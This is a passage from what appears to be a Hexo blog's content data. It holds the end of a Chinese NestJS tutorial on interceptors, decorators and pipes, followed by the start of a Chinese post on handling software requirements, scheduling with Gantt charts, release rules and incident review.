class=\"keyword\">type</span>: SensitiveType, pathname: <span class=\"built_in\">string</span>, parameters: <span class=\"built_in\">any</span>, results: <span class=\"built_in\">any</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.sensitiveRepository.save(&#123;</span><br><span class=\"line\">            <span class=\"keyword\">type</span>,</span><br><span class=\"line\">            pathname,</span><br><span class=\"line\">            parameters,</span><br><span class=\"line\">            results,</span><br><span class=\"line\">        &#125;).catch(<span class=\"function\"><span class=\"params\">e</span> =&gt;</span> e);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> getSensitive(<span class=\"keyword\">type</span>: SensitiveType) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.sensitiveRepository.find(&#123; </span><br><span class=\"line\">            where: &#123;</span><br><span class=\"line\">                <span class=\"keyword\">type</span>,</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"controller-修改\"><a href=\"#controller-修改\" class=\"headerlink\" title=\"controller 修改\"></a>controller 修改</h2><p>controller 比较简单，只需要简单的查询即可。敏感信息写入则是通过 decorator + interceptor 来实现</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/sensitive/sensitive.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Controller, Get, Query &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./sensitive.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'sensitive'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly sensitiveService: SensitiveService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'/get-by-type'</span>)</span><br><span class=\"line\">    getSensitive(<span class=\"meta\">@Query</span>(<span class=\"string\">'type'</span>) <span class=\"keyword\">type</span>: SensitiveType) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.sensitiveService.getSensitive(<span class=\"keyword\">type</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"新增装饰器\"><a href=\"#新增装饰器\" class=\"headerlink\" title=\"新增装饰器\"></a>新增装饰器</h2><p>装饰器的用场来了，只需要告诉某个接口需要敏感操作记录，并指定类型即可。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/decorators</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SetMetadata &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../sensitive/constants'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> SensitiveOperation = <span class=\"function\">(<span class=\"params\"><span class=\"keyword\">type</span>: SensitiveType</span>) =&gt;</span> SetMetadata(<span class=\"string\">'sensitive-operation'</span>, <span class=\"keyword\">type</span>);</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br></pre></td></tr></table></figure><p>通过传参的方式，定义敏感操作的类型。在数据库中可以分类，通过索引的方式查找修改入参和结果。</p><h2 id=\"拦截器\"><a href=\"#拦截器\" class=\"headerlink\" title=\"拦截器\"></a>拦截器</h2><p>重点来了！！</p><p>和守卫权限校验类似，通过 <code>reflector</code> 取出内存中的 sensitive-operation 类型。</p><p>新建 <code>src/common/interceptors/sensitive.interceptor.ts</code></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/interceptors/sensitive.interceptor.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, NestInterceptor, ExecutionContext, CallHandler &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Reflector &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveService &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../../sensitive/sensitive.service'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../../sensitive/constants'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Observable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'rxjs'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; tap &#125; <span class=\"keyword\">from</span> <span class=\"string\">'rxjs/operators'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> SensitiveInterceptor <span class=\"keyword\">implements</span> NestInterceptor &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> reflector: Reflector, <span class=\"keyword\">private</span> sensitiveService: SensitiveService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  intercept(context: ExecutionContext, next: CallHandler): Observable&lt;<span class=\"built_in\">any</span>&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = context.switchToHttp().getRequest();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">type</span> = <span class=\"keyword\">this</span>.reflector.get&lt;SensitiveType | <span class=\"literal\">undefined</span>&gt;(<span class=\"string\">'sensitive-operation'</span>, context.getHandler());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">type</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>  next.handle();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> next</span><br><span class=\"line\">      .handle()</span><br><span class=\"line\">      .pipe(</span><br><span class=\"line\">        tap(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> <span class=\"keyword\">this</span>.sensitiveService.setSensitive(<span class=\"keyword\">type</span>, request.url, request.body, data)),</span><br><span class=\"line\">      );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>并在 app.module.ts 中引入全局。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.module.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; APP_GUARD, APP_INTERCEPTOR &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveInterceptor &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./common/interceptors/sensitive.interceptor'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  providers: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      provide: APP_INTERCEPTOR,</span><br><span class=\"line\">      useClass: SensitiveInterceptor,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> AppModule &#123; &#125;</span><br></pre></td></tr></table></figure><p></p><h2 id=\"其他模块引用\"><a href=\"#其他模块引用\" class=\"headerlink\" title=\"其他模块引用\"></a>其他模块引用</h2><p>student 模块引入<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/students/students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveOperation &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/decorators'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; SensitiveType &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../sensitive/constants'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@SensitiveOperation</span>(SensitiveType.Set)</span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'set-student-name'</span>)</span><br><span class=\"line\">    setStudentName(<span class=\"meta\">@User</span>() user: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.setStudent(user);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>仅需要在接口前引入 <code>@SensitiveOperation(SensitiveType.Set)</code> 即可！是不是非常优美。</p><p>再来调用下！<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 使用命令行调用</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/<span class=\"built_in\">set</span>-student-name -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx1\"&#125;'</span></span><br><span class=\"line\">// =&gt; &#123;<span class=\"string\">\"name\"</span>:<span class=\"string\">\"gdccwxx1\"</span>,<span class=\"string\">\"id\"</span>:3,<span class=\"string\">\"updateDate\"</span>:<span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span>,<span class=\"string\">\"createDate\"</span>:<span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span>&#125;%</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 打开浏览器</span><br><span class=\"line\">http://localhost:3000/sensitive/get-by-type?<span class=\"built_in\">type</span>=<span class=\"built_in\">set</span></span><br><span class=\"line\">// =&gt; [&#123;</span><br><span class=\"line\">//  id: 1,</span><br><span class=\"line\">//  <span class=\"built_in\">type</span>: <span class=\"string\">\"Set\"</span>,</span><br><span class=\"line\">//  pathname: <span class=\"string\">\"/students/set-student-name\"</span>,</span><br><span class=\"line\">//  parameters: &#123; user: <span class=\"string\">\"gdccwxx1\"</span> &#125;,</span><br><span class=\"line\">//  results: &#123; name: <span class=\"string\">\"gdccwxx1\"</span>, id: 3, updateDate: <span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span>, createDate: <span class=\"string\">\"2021-09-17T05:48:41.685Z\"</span> &#125;,</span><br><span class=\"line\">//  createDate: <span class=\"string\">\"2021-09-17T05:48:41.719Z\"</span></span><br><span class=\"line\">// &#125;]</span><br></pre></td></tr></table></figure><p></p><p>bingo！这样就达到了我们想要的目的！</p><p>在不影响原有业务逻辑的情况下，仅是在接口处做标识的简单调用。实现了 <code>AOP</code> 的调用方式。对老代码的改造和新业务的编写都十分有用。</p><h1 id=\"管道-Pipes\"><a href=\"#管道-Pipes\" class=\"headerlink\" title=\"管道 Pipes\"></a>管道 Pipes</h1><p><img src=\"/nestJs/nest-js-tutorial-4/pipes.png\" alt=\"pipes\"><br>NestJs <code>Pipes</code> 的概念和 linux <code>shell</code> 的概念非常相似，都是通过前者的输出再做一些事情。</p><p>它的应用场景也非常广，例如：数据转化，数据校验等…</p><p>对数据输入时的操作非常有用。对复杂数据校验，例如表单数据等十分有用。</p><p>我们没有复杂输入，我们来使用简单的数据转化，实现在名字前加上🇨🇳</p><h2 id=\"新建-Pipes\"><a href=\"#新建-Pipes\" class=\"headerlink\" title=\"新建 Pipes\"></a>新建 Pipes</h2><p>新建 <code>src/common/pipes/name.pipes.ts</code>。<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/pipes/name.pipes.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; PipeTransform, Injectable, ArgumentMetadata &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> TransformNamePipe <span class=\"keyword\">implements</span> PipeTransform &#123;</span><br><span class=\"line\">  transform(name: <span class=\"built_in\">string</span>, metadata: ArgumentMetadata) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">`🇨🇳 <span class=\"subst\">$&#123;name.trim()&#125;</span>`</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>和其他 NestJs 一样，都需要重载一边内置对象。<code>Pipes</code> 也需要重载 <code>PipeTransform</code>。</p><h2 id=\"使用管道\"><a href=\"#使用管道\" class=\"headerlink\" title=\"使用管道\"></a>使用管道</h2><p>在 <code>controller</code> 中使用 <code>pipes</code>。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; TransformNamePipe &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/pipes/name.pipes'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"meta\">@Get</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYou(<span class=\"meta\">@Query</span>(<span class=\"string\">'name'</span>, TransformNamePipe) name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>query 的第二个参数是 pipes, 也可以使用多个 pipes 对数据连续处理</p><h2 id=\"调用接口\"><a href=\"#调用接口\" class=\"headerlink\" title=\"调用接口\"></a>调用接口</h2><p>再浏览器访问<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class=\"line\">// =&gt; Im student 🇨🇳 gdccwxx</span><br></pre></td></tr></table></figure><p></p><p>这样就实现了简单版本的数据转换了！</p><h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>至此，NestJs 的入门篇章就结束了。</p><p>简单回顾下教程内容：</p><ul><li>通过 <code>nest cli</code> 新建工程、新建模块</li><li>通过 <code>@Get</code> 和 <code>@Post</code> 实现 get、post 请求</li><li>通过 <code>dto</code> 限制对参数进行限制</li><li>自定义 <code>decorator</code> 实现参数获取、设置 <code>metadata</code></li><li>调用内置 <code>log</code> 实现日志规范化</li><li>使用 <code>typeorm</code> 对数据库连接和基础操作，并进行联表操作及查询</li><li>使用 <code>guard</code> 对参数进行校验（可扩展成登录态）</li><li>使用 <code>interceptor</code> 实现敏感数据落地</li><li>使用 <code>pipes</code> 实现数据格式化</li></ul><p>笔者也在 NestJs 逐渐探索中。它不仅包括简单的数据服务，还支持 <code>GraphQL</code>、<code>SSE</code>、<code>Microservice</code> 等等，是综合性非常强的框架。</p><p>btw：这是笔者用这么久以来最喜欢的 Node 框架了</p><p>感谢你的阅读～</p>"},{"title":"做需求搞明白这几点，和加班说再见","date":"2021-08-23T05:39:15.000Z","dir":"需求开发","keywords":"需求开发","_content":"![xmind](xmind.png)\n## 写在前面\n你是不是接需求后手足无措？是不是天天忙碌，但又效率不高？是不是需求沟通前后不一致，导致重复修改？几年前刚踏入职场生活的我，对此深有体会。经过沉淀，终于搞明白怎么高效开发，高效会议，总结这几点经验：和产品做朋友、需求对齐和排期、需求方案设计与发布上线、事故与复盘。从此高效工作，早早下班。\n\n## 树立正确的观点\n阅读之前，不妨问问自己，工作的目的是啥？\n也许每个人有不同的观点。有人觉得事情永远都干不完，不如慢慢做，自己也更轻松。但有种高级的思维方式是：尽自己努力做好每件事情。因为只有好好对工作，升职加薪才会好好对你；只有对工作表现出热情，老板才会对你有信心，才更可能在职场激烈的竞争中脱颖而出。\n\n## 和产品做朋友\n产品是一群有想象力，能把抽象的事情具体化的人。他们不仅有许多新颖的点子，还能迅速的 get 到你说的想法。和产品同学做朋友不仅能更加顺利的合作，还能开拓视野，增长见识。比如和产品一起坐电梯，他们可能会想为什么要装镜子，而你会想电梯系统是怎么实现的。在不同角度看同一件事情不仅十分有趣，还能扩展更多可能，不妨试试看。\n### 第一手需求\n和产品做朋友，能比别人更快的拿到第一手需求。\n产品的需求并不是凭空而来，它可能是从竞品、客户需或老板提出的，产品往往是把需求具体化的人。他们更多的关注是需求是怎么实现的。以及联动的功能和异常场景。而开发则会把具体的需求通过编码实现。\n当然，正因为产品的角度更多的是怎么实现需求，也更容易过于关注需求实现，而把原本用户诉求无限放大，忽略了需求本身。\n开发拿到第一手需求最好的方式是如何实现需求出发，可以通过哪些方式来解决。也许需求可以不用开发，只需换个角度看问题就能轻松解决。\n\n核心思想:  why\n\n## 需求对齐和排期\n### 需求宣讲\n![discuss](discuss.png)\n需求宣讲是产品与开发、测试把方案内容输出的主要途径。一份需求的宣讲过程，大致可分为需求宣讲前、需求宣讲中、需求宣讲后。遵循一套流程能有效避免踩坑和高效率会议。\n\n#### 需求宣讲前：\n亚马逊的高管会议，会在开会前半小时阅读会议内容，再根据梳理的疑问进行讨论。\n阅读需求文档是必不可少的过程。有效的阅读文档，能在需求宣讲时更能提出自己的疑问与观点，能避免前期因为准备不足，导致的会议效率低下。这样的高效工作方式更值得作为打工人的我们借鉴。需求宣讲前可以从：\n- 看需求：了解需求的背景，和类似场景其他产品怎么实现的\n- 提疑问：融合 Why、How、What 去思考\n- 给方案：对现有的技术给需求的方案\n- 给排期：给出大概的排期，以 人/天 为单位进行估算\n\n#### 需求宣讲中：\n需求宣讲中主要是对齐方案，解决疑惑。作为开发者期望的是对所有异常场景与方案有大概的了解，且高效会议，一次通过。需求宣讲中围绕：\n- 提出疑问：提出会前准备的疑问，并发散出新的疑问\n- 确认需求：和产品、测试方沟通对齐表现和异常场景，最好有录屏作为证据\n- 一次通过：有不确定的点会中立马拉上相关同学对齐，争取一次性通过会议，不开第二次\n- 确认 deadline: 与估算的 人/天 进行匹配，有疑问可向负责人提出\n\n#### 需求宣讲后：\n会议后通常需要结论的沉淀。这样的好处是在不记得需求细节时可以翻看存档来确认细节、防止产品甩锅等。宣讲内容沉淀的方式：\n- 录像回放：有问题可将录像回放，找到讨论的地方\n- 会议纪要：将本次的结论、需要跟进的点写下来，发群里，并艾特相关同学\n\n会议纪要常用模版：\n经过与产品方、xx方的沟通，有以下结论与跟进事项：\n结论：\n1、xxx\n跟进事项：\n1、 xxxx @xxxx 同学\n辛苦 @xxxx 关注并确认\n\n核心思想: How\n\n### 目标拆解与甘特图\n有了具体的需求后，就来到了排期缓解。产品同学希望越快越好，而 PM（Project Manager） 会根据版本的时间点排期。也正因为二者的目标不同，会存在 PM 的排期与产品期望时间并不是相同时间点。为了保证需求不因为自己 delay，合理的人力估算和目标拆解变得必不可少。\n#### 目标拆解\n好的目标拆解通常会以大目标和小目标来进行拆分。大目标包括需求评审时间、开发时间、联调时间、测试时间、code review 时间、发布时间，以时间节点为颗粒；小目标包括开发进度、联调进度，以每天的事件为颗粒。\n评估做不完需求该怎么办？\n- 需求上：迭代处理，分成本期必保、本期冲刺、本期不做的几种类型\n- 人力上：评估加人能否解决\n- 时间上：deadline delay 还是需求 delay\n\n#### 需求拆分的小 tips\n将开发、联调事件拆解，细分到每周、每天的工作。让每天的进度可控，按时完成工作，按时回家。出现进度不可控则周末适当调整下。\n对目标拆解到具体内容：\n- 需求 deadline 倒推出需求开发完成、提测、发布时间点\n- 根据时间点定具体开发内容，每周目标、每日目标\n\n小目标拆解后，甘特图就更能显示工作内容和进度了。\n### 甘特图\n![gantt-chart](gantt-chart.png)\n\n甘特图能清晰的知道工作进度。个人使用甘特图能清晰的定好每天的目标，高效工作；多人合作使用甘特图能划分每个人的工作内容以及进度同步。\n使用甘特图的好处很多，它不仅能直观、定量的看到进度，还能知道预期目标和实际产出的差值，能有效知道进度快、慢的原因。更重要的是有沉淀，有利于需求完成后的回顾，及时几年后看到自己画的甘特图，也能很快的回忆起当时做需求的问题与困难，充当需求快照的作用。\n\n核心思想: When\n\n## 从方案设计到发布上线\n从方案设计到发布上线，基本属于开发和测试的工作。方案设计能具体量化需求方案，也能有效保证开发进度，这一环节必不可少。开发和测试的有效沟通也能帮助开发找到代码漏洞，避免发布上线后带来的事故，这些环节十分重要。\n### 方案设计\n方案设计有多香，体验过的人都知道。它的好处在于全局的思考需求，比较容易给出全局最优，而不仅仅是局部最优。方案设计不仅在开发阶段起着举足轻重的作用，还对后续维护有很大的便利。方案设计可以围绕这几点写：\n- 时间人物：标注需求关键的时间节点和参与方\n- 业内方案：例如业内实现和竞品分析等\n- 方案设计：方案的具体逻辑，包括设计稿、流程图、库表字段等\n- 其他：流程卡点、自我反思或结论留底等\n### 处理 bug 的规矩\n产品是开发的上游，测试是开发的下游。测试同学对产品形态的表现甚至比产品还更关心，多和测试同学沟通，也能让产品有更良好的发展。要和测试做朋友，从来一杯奶茶做起。当然立好规矩也能避免在需求测试过程中增加沟通成本。\n- 提单前：先沟通到底是开发原因还是其他原因，定好责任方与优先级\n- 提单时：必须包含复现路径及截图，最好包含账号信息和录屏\n- 提单后：非必要场景沟通能否降低优先级，不好解决的问题能否转成需求单\n### 发布条例\n流程的建立很大程度上是对人的保护，遵循流程能有效程度上保护自己。\n- 发布计划：列好发布计划，从 MR、代码到配置，使用发布标记记录每个发布时间点\n- 发布透明：需要发的功能、bugfix和压测接口明确知会\n- 做好灰度：发布的功能遵循一定规则灰度\n- 立刻验证：发布后的第一时间线上验证，保证发布功能正常\n- 留守保障：留守一定的时间，保证发布后无明显波动，方便有问题及时响应\n核心思想: 规矩\n\n## 事故与复盘\n在需求发布过程中，事故难免会发生。及时、正确的处理事故，在职场上是对自己的保护。同样能帮助自己更快的成长，减少相同错误的发生。\n### 透明原则\n事故发生后第一时间向上级汇报，并定时汇报进度，即便是自己闯出来的。遇到事故建议处理方式：\n- 事故发生时：\n1、大群里艾特相关同学及上级，并同时电话上级，确认信息同步完全\n2、能恢复立刻恢复\n3、每隔几分钟向上汇报，即使没有进度\n4、向上级寻求帮助，直到问题解决\n- 事故发生后：反思与沉淀\n\n### 处理事故的五要素\n- 定义问题：能不能量化指标，比如出现路径、指标数据灯\n- 发现问题：能不能有监控，及时和准确的告警\n- 分析问题：能不能有工具辅助，提升分析问题的效率\n- 解决问题：能不能第一时间修复，为用户解决问题\n- 预防问题：能不能补充相关case，保证犯过的错误不再犯\n\n## 最后\n写到这里基本完成了，每个点笔者都亲身经历过也实践过。从“年轻”到“老”程序员，磨平了很多冲动与莽撞，沉淀了各个流程的“最佳实践”。如今带小朋友一起干活，对我而言，也是个全新的阶段。这篇文章也算为上阶段的思考做沉淀吧，也希望帮助到有需要的人。\n感谢你阅读到这里。\n\n","source":"_posts/the-skills-of-develop.md","raw":"---\ntitle: 做需求搞明白这几点，和加班说再见\ndate: 2021-08-23 13:39:15\ntags: 需求开发\ndir: 需求开发\nkeywords: 需求开发\n---\n![xmind](xmind.png)\n## 写在前面\n你是不是接需求后手足无措？是不是天天忙碌，但又效率不高？是不是需求沟通前后不一致，导致重复修改？几年前刚踏入职场生活的我，对此深有体会。经过沉淀，终于搞明白怎么高效开发，高效会议，总结这几点经验：和产品做朋友、需求对齐和排期、需求方案设计与发布上线、事故与复盘。从此高效工作，早早下班。\n\n## 树立正确的观点\n阅读之前，不妨问问自己，工作的目的是啥？\n也许每个人有不同的观点。有人觉得事情永远都干不完，不如慢慢做，自己也更轻松。但有种高级的思维方式是：尽自己努力做好每件事情。因为只有好好对工作，升职加薪才会好好对你；只有对工作表现出热情，老板才会对你有信心，才更可能在职场激烈的竞争中脱颖而出。\n\n## 和产品做朋友\n产品是一群有想象力，能把抽象的事情具体化的人。他们不仅有许多新颖的点子，还能迅速的 get 到你说的想法。和产品同学做朋友不仅能更加顺利的合作，还能开拓视野，增长见识。比如和产品一起坐电梯，他们可能会想为什么要装镜子，而你会想电梯系统是怎么实现的。在不同角度看同一件事情不仅十分有趣，还能扩展更多可能，不妨试试看。\n### 